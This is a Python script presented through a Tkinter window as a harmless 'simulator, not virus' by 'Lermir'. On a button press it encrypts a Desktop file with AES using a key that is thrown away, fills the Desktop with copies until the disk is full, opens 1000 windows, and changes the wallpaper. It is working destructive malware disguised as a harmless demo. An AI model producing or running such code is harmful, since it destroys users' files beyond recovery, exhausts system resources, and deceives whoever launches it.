import os
import shutil
from tkinter import Tk, Label, Button
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import getpass
import ctypes
import subprocess

def encrypt_file(input_file, output_file, key):
    with open(input_file, 'rb') as f:
        data = f.read()

    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()

    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    with open(output_file, 'wb') as f:
        f.write(iv)
        f.write(encrypted_data)

def fill_desktop_with_files(encrypted_file):
    desktop_path = get_desktop_path()
    file_number = 1

    while True:
        new_file_name = f"Lermir was here {file_number}.enc"
        new_file_path = os.path.join(desktop_path, new_file_name)

        try:
            shutil.copy(encrypted_file, new_file_path)
            file_number += 1
        except OSError:
            print("Desktop sudah penuh!")
            break

def get_desktop_path():
    user = getpass.getuser()
    if os.name == 'nt':
        return os.path.join(f'C:\\Users\\{user}\\Desktop')
    else:
        return os.path.join(os.path.expanduser('~'), 'Desktop')

def open_multiple_windows():
    for _ in range(1000):
        subprocess.Popen(["python", "-c", "from tkinter import Tk, Label; root = Tk(); Label(root, text='Lermir was here', font=('Arial', 12)).pack(); root.mainloop()"])

def change_wallpaper():
    user = getpass.getuser()
    wallpaper_path = os.path.join(os.getcwd(), "lermir.png")

    if os.path.exists(wallpaper_path):
        if os.name == 'nt':
            ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 0)
        else:
            print("Mengubah wallpaper hanya didukung di Windows.")
    else:
        print(f"Gambar {wallpaper_path} tidak ditemukan.")

def run_simulator():
    desktop_path = get_desktop_path()
    print(f"Desktop path: {desktop_path}")

    files = [f for f in os.listdir(desktop_path) if os.path.isfile(os.path.join(desktop_path, f))]
    if not files:
        print("Tidak ada file di Desktop untuk dienkripsi.")
        return

    input_file = os.path.join(desktop_path, files[0])
    encrypted_file = os.path.join(desktop_path, "Lermir.enc")

    key = os.urandom(32)

    encrypt_file(input_file, encrypted_file, key)
    print(f"File {input_file} telah dienkripsi menjadi {encrypted_file}")

    fill_desktop_with_files(encrypted_file)
    open_multiple_windows()
    change_wallpaper()

def create_gui():
    window = Tk()
    window.title("Simulator by Lermir")
    window.geometry("400x200")

    label = Label(window, text="This is simulator,,not virus (by Lermir)", font=("Arial", 16))
    label.pack(pady=20)

    button = Button(window, text="Run This App", font=("Arial", 12), command=run_simulator)
    button.pack(pady=20)

    window.mainloop()

if __name__ == "__main__":
    create_gui()
